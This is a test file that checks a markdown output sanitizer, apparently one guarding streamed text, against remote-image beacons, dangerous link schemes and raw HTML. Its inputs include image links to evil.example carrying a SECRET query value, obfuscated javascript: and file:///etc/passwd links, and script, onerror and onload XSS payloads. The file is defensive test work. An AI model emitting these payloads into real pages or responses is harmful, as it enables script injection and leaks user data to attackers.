import { describe, expect, it } from "vitest";
import { OutputGuard, renderSafeBlocks } from "../../src/pipeline/output-guard";
import type { SafeBlock, SafeInline } from "../../src/pipeline/types";

const BLOCK_TYPES = new Set(["paragraph", "heading", "list", "blockquote", "code_block", "table"]);
const INLINE_TYPES = new Set(["text", "emphasis", "strong", "code", "link", "break"]);

interface Walk {
  nodeTypes: string[];
  links: Extract<SafeInline, { type: "link" }>[];
  text: string;
}

function walk(blocks: readonly SafeBlock[]): Walk {
  const out: Walk = { nodeTypes: [], links: [], text: "" };
  const inline = (nodes: readonly SafeInline[]) => {
    for (const n of nodes) {
      out.nodeTypes.push(n.type);
      if (n.type === "text" || n.type === "code") out.text += n.text;
      if (n.type === "emphasis" || n.type === "strong") inline(n.children);
      if (n.type === "link") {
        out.links.push(n);
        inline(n.children);
      }
    }
  };
  const block = (b: SafeBlock) => {
    out.nodeTypes.push(b.type);
    switch (b.type) {
      case "paragraph":
      case "heading":
        inline(b.children);
        break;
      case "blockquote":
        b.children.forEach(block);
        break;
      case "list":
        b.items.forEach((item) => item.forEach(block));
        break;
      case "code_block":
        out.text += b.text;
        break;
      case "table":
        b.header.forEach(inline);
        b.rows.forEach((row) => row.forEach(inline));
        break;
    }
  };
  blocks.forEach(block);
  return out;
}

function expectOnlySafeNodes(blocks: readonly SafeBlock[]): Walk {
  const result = walk(blocks);
  for (const type of result.nodeTypes) {
    expect(BLOCK_TYPES.has(type) || INLINE_TYPES.has(type), `unexpected node type ${type}`).toBe(true);
  }
  // Structural: no node anywhere may carry a field that a renderer could load or execute.
  expect(JSON.stringify(blocks)).not.toMatch(/"(src|srcset|href|style|onerror|onload|html|innerHTML)"\s*:/);
  return result;
}

describe("OutputGuard: images", () => {
  const cases: Record<string, string> = {
    remote: "![x](https://evil.example/p.png?k=SECRET)",
    "data uri": "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
    "protocol-relative": "![x](//evil.example/p.png)",
    "with title": '![x](https://evil.example/p.png "title")',
    reference: "![x][r]\n\n[r]: https://evil.example/p.png",
    "angle destination": "![x](<https://evil.example/p.png>)",
    "linked image": "[![x](https://evil.example/p.png)](https://evil.example/click)",
    "inside table": "| a |\n|---|\n| ![x](https://evil.example/p.png) |",
    "inside list": "- ![x](https://evil.example/p.png)",
    "inside quote": "> ![x](https://evil.example/p.png)",
    "inside heading": "# ![x](https://evil.example/p.png)",
    "inside emphasis": "*![x](https://evil.example/p.png)*",
  };
  for (const [name, markdown] of Object.entries(cases)) {
    it(`yields no image or remote resource: ${name}`, () => {
      const blocks = renderSafeBlocks(markdown);
      const result = expectOnlySafeNodes(blocks);
      expect(result.nodeTypes).not.toContain("image");
      expect(JSON.stringify(blocks)).not.toContain("SECRET");
      // A destination the parser refuses (data:, javascript:) stays literal text, which is inert.
      // The only place a remote address may survive is a visible link destination.
      expect(JSON.stringify(blocks).replace(/evil\.example\/click/g, "")).not.toContain("evil.example");
    });
  }
});

describe("OutputGuard: link schemes", () => {
  const unsafe = [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "jav&#x61;script:alert(1)",
    "java%0Ascript:alert(1)",
    "java\tscript:alert(1)",
    " javascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "file:///etc/passwd",
    "blob:https://evil.example/uuid",
    "ftp://evil.example/x",
    "//evil.example/x",
    "/relative/path",
    "#fragment",
  ];
  for (const destination of unsafe) {
    it(`never makes a link from ${JSON.stringify(destination)}`, () => {
      const blocks = renderSafeBlocks(`[click me](<${destination}>) and [again](${destination.replace(/ /g, "%20")})`);
      const result = expectOnlySafeNodes(blocks);
      expect(result.links.filter((l) => !/^(https?:\/\/|mailto:)/i.test(l.destination))).toEqual([]);
      expect(result.text).toContain("click me");
    });
  }

  it("does not turn an autolink with a dangerous scheme into a link", () => {
    const result = expectOnlySafeNodes(renderSafeBlocks("<javascript:alert(1)> <data:text/html,x>"));
    expect(result.links).toEqual([]);
  });

  it("shows the real destination, whatever the link text claims", () => {
    const result = expectOnlySafeNodes(renderSafeBlocks("[https://bank.example/login](https://evil.example/steal)"));
    expect(result.links).toHaveLength(1);
    expect(result.links[0]?.destination).toBe("https://evil.example/steal");
    expect(result.links[0]?.destinationDisplay).toBe("https://evil.example/steal");
  });

  it("keeps destination and display identical for every surviving link", () => {
    const md = ["[a](https://a.example/?q=1&r=2)", "[b](mailto:x@y.example)", "<https://c.example/z>"].join("\n\n");
    for (const link of expectOnlySafeNodes(renderSafeBlocks(md)).links) {
      expect(link.destinationDisplay).toBe(link.destination);
    }
  });

  it("never lets a control character reach a link destination", () => {
    const result = expectOnlySafeNodes(renderSafeBlocks("[x](https://evil.example/a\u0000b\u0007c)"));
    for (const link of result.links) {
      for (const char of link.destination) expect(char.charCodeAt(0)).toBeGreaterThan(0x1f);
    }
  });
});

describe("OutputGuard: raw HTML is literal text", () => {
  const payloads = [
    "<script>alert(1)</script>",
    "<iframe src=\"https://evil.example\"></iframe>",
    "<style>@import url(https://evil.example/x.css)</style>",
    "<img src=x onerror=alert(1)>",
    "<a href=\"javascript:alert(1)\" onclick=\"alert(1)\">x</a>",
    "<svg onload=alert(1)></svg>",
    "<body onload=alert(1)>",
    "<link rel=stylesheet href=https://evil.example/x.css>",
    "<meta http-equiv=refresh content=\"0;url=https://evil.example\">",
    "<object data=https://evil.example></object>",
    "<form action=https://evil.example><input name=k></form>",
    "<details open ontoggle=alert(1)>",
    "<!-- hidden --><div>x</div>",
    "<![CDATA[<script>alert(1)</script>]]>",
  ];
  for (const payload of payloads) {
    it(`emits ${payload.slice(0, 32)} as text only`, () => {
      for (const markdown of [payload, `before ${payload} after`, `\n\n${payload}\n\n`, `> ${payload}`, `- ${payload}`, `# ${payload}`]) {
        const blocks = renderSafeBlocks(markdown);
        const result = expectOnlySafeNodes(blocks);
        expect(result.links).toEqual([]);
        expect(result.nodeTypes).not.toContain("html");
      }
    });
  }

  it("keeps the markup visible as characters, not as an element", () => {
    const result = expectOnlySafeNodes(renderSafeBlocks("<script>alert(1)</script>"));
    expect(result.text).toContain("<script>alert(1)</script>");
  });

  it("treats an HTML block start as a plain paragraph", () => {
    const blocks = renderSafeBlocks("<div>\n<script>alert(1)</script>\n</div>");
    expect(blocks.every((b) => b.type === "paragraph")).toBe(true);
  });
});

describe("OutputGuard: nested and mixed constructs", () => {
  it("survives deep nesting without producing an unsafe node", () => {
    const md = "> ".repeat(40) + "- ".repeat(20) + "[![x](https://evil.example/p.png)](javascript:alert(1)) <script>x</script>";
    const result = expectOnlySafeNodes(renderSafeBlocks(md));
    expect(result.links).toEqual([]);
  });

  it("keeps a hostile link inside emphasis, strong and table cells safe", () => {
    const md = [
      "**[a](javascript:alert(1))** *[b](data:text/html,x)*",
      "",
      "| h |",
      "|---|",
      "| [c](javascript:alert(1)) <img src=x onerror=alert(1)> |",
    ].join("\n");
    const result = expectOnlySafeNodes(renderSafeBlocks(md));
    expect(result.links).toEqual([]);
    expect(result.text).toContain("<img src=x onerror=alert(1)>");
  });

  it("does not let a code fence carry executable content out", () => {
    const blocks = renderSafeBlocks("```html\n<script>alert(1)</script>\n![x](https://evil.example/p.png)\n```");
    expect(blocks).toEqual([
      { type: "code_block", language: "html", text: "<script>alert(1)</script>\n![x](https://evil.example/p.png)\n" },
    ]);
  });

  it("does not let a language tag smuggle markup", () => {
    const blocks = renderSafeBlocks('```"><script>alert(1)</script>\nx\n```');
    for (const block of blocks) {
      if (block.type === "code_block") expect(block.language ?? "").not.toMatch(/\s/);
    }
    expectOnlySafeNodes(blocks);
  });

  it("does not produce a link for a bare URL", () => {
    expect(expectOnlySafeNodes(renderSafeBlocks("see https://evil.example/x?k=1 now")).links).toEqual([]);
  });

  it("does not interpret HTML entities into live markup", () => {
    const result = expectOnlySafeNodes(renderSafeBlocks("&lt;script&gt;alert(1)&lt;/script&gt; &#60;img src=x&#62;"));
    expect(result.links).toEqual([]);
  });

  it("stays safe for every prefix of a hostile stream", () => {
    const hostile = "Look ![x](https://evil.example/p.png?k=SECRET) <script>x</script> [y](javascript:alert(1)) ```\n<iframe>";
    const guard = new OutputGuard();
    let last: SafeBlock[] = [];
    for (const char of hostile) {
      last = guard.push(char);
      // A half-received image is literal text for a moment; it is never a node that loads.
      expect(expectOnlySafeNodes(last).links).toEqual([]);
    }
    expect(JSON.stringify(last)).not.toContain("SECRET");
  });
});
